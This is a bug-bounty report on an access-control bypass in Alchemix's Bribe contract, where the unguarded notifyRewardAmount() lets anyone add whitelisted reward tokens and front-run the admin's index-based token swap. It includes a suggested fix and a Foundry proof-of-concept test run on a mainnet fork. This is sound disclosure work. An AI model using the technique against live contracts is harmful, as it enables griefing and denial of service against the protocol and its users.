# 31462 - \[SC - Medium] Alchemix addReward access control can be bypas...

Submitted on May 19th 2024 at 22:24:08 UTC by @Norah for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31462

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

Impacts:

* Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

The bribe contract has an access-controlled function `addRewardToken()` that allows only the corresponding gauge to add a new reward token to the rewards list. Although many tokens are whitelisted by the voter contract, only the gauge can determine which of these whitelisted tokens should be added to the bribe contract as a reward token.

```solidity
    function addRewardToken(address token) external {
        require(msg.sender == gauge, "not being set by a gauge");
       
        _addRewardToken(token);
    }
```

```solidity
    function _addRewardToken(address token) internal {
        if (!isReward[token] && token != address(0)) {
            require(rewards.length < MAX_REWARD_TOKENS, "too many rewards tokens");
            require(IVoter(voter).isWhitelisted(token), "bribe tokens must be whitelisted");

            isReward[token] = true;
            rewards.push(token);
        }
    }
```

## Vulnerability Details

The problem lies in the `notifyRewardAmount()` function, which lacks any access control. This function allows anyone to inject a reward into the bribe contract by specifying the token address and amount. If the token is whitelisted but not yet added to the rewards list, it will simply be added.

```
    function notifyRewardAmount(address token, uint256 amount) external lock {
        require(amount > 0, "reward amount must be greater than 0");

        // If the token has been whitelisted by the voter contract, add it to the rewards list
        require(IVoter(voter).isWhitelisted(token), "bribe tokens must be whitelisted");

        _addRewardToken(token);

        // bribes kick in at the start of next bribe period
        uint256 adjustedTstamp = getEpochStart(block.timestamp);
        uint256 epochRewards = tokenRewardsPerEpoch[token][adjustedTstamp];

        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);

        tokenRewardsPerEpoch[token][adjustedTstamp] = epochRewards + amount;
        periodFinish[token] = adjustedTstamp + DURATION;

        emit NotifyReward(msg.sender, token, adjustedTstamp, amount);
    }

```

As a result, anyone can add a whitelisted token to the bribe contract by calling `notifyRewardAmount()` function with the token address and a minimal amount of 1 wei.

## Impact Details

Malicious users can add numerous reward tokens to the bribe, misleading users or external projects querying the list of reward tokens for a particular bribe contract. Additionally, there is a `swapOutRewardToken()` function that allows the admin of the voter contract to swap out reward tokens.

The admin must call `swapOutRewardToken(uint256 oldTokenIndex, address oldToken, address newToken)` with the respective indexes of the tokens they wish to swap out. A malicious user (e.g., an aggressive competitor) can front-run the admin's transaction by calling `notifyRewardAmount()`, adding new tokens and thereby changing the previous token indexes to alter the intended outcome of the admin's transaction. This can also lead to a denial of service (DoS) for other normal functionalities, at least temporarily.

## Recommendation

Remove the functionality that allows any user to add reward tokens by calling `notifyRewardAmount().`

```
    function notifyRewardAmount(address token, uint256 amount) external lock {
        require(amount > 0, "reward amount must be greater than 0");

        // If the token has been whitelisted by the voter contract, add it to the rewards list
        require(IVoter(voter).isWhitelisted(token), "bribe tokens must be whitelisted");

---   _addRewardToken(token);

        // bribes kick in at the start of next bribe period
        uint256 adjustedTstamp = getEpochStart(block.timestamp);
        uint256 epochRewards = tokenRewardsPerEpoch[token][adjustedTstamp];

        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);

        tokenRewardsPerEpoch[token][adjustedTstamp] = epochRewards + amount;
        periodFinish[token] = adjustedTstamp + DURATION;

        emit NotifyReward(msg.sender, token, adjustedTstamp, amount);
    }
```

## Proof of Concept

* Below test showcases how any users can add any whitelisted token to the `rewardlist` using `notifyRewardAmount()` function.
* Add the below test into the `voting.t.sol` file of the current test suite and run via following command :
* forge test --fork-url <https://eth-mainnet.g.alchemy.com/v2/{Alchemy-Api-Key}> --match-test "testRewardTokenAddition" -vv

```

    function testRewardTokenAddition() public{

        //lets whitelist usdc for the sake of example.    
        hevm.prank(address(timelockExecutor));
        IVoter(voter).whitelist(usdc);

        //current reward token in the list.
        address bribeAddress = voter.bribes(address(sushiGauge));
        uint256 rewardsLength = IBribe(bribeAddress).rewardsListLength();
        console2.log("rewards_list : ",IBribe(bribeAddress).rewards(rewardsLength-1));

        //Malicious User calling the notifyRewardAmount to add USDC as rewards token into the list 
        //with the usdc address and just 1 wei of amount

        deal(usdc, address(this), 1);
        IERC20(usdc).approve(bribeAddress, 1);

        IBribe(bribeAddress).notifyRewardAmount(usdc, 1);
        rewardsLength = IBribe(bribeAddress).rewardsListLength();

        //usdc has been added to the rewards list.
        console2.log("rewards_list : ",IBribe(bribeAddress).rewards(rewardsLength-1));
        assertEq(IBribe(bribeAddress).rewards(rewardsLength-1),usdc); 
        
    }

```
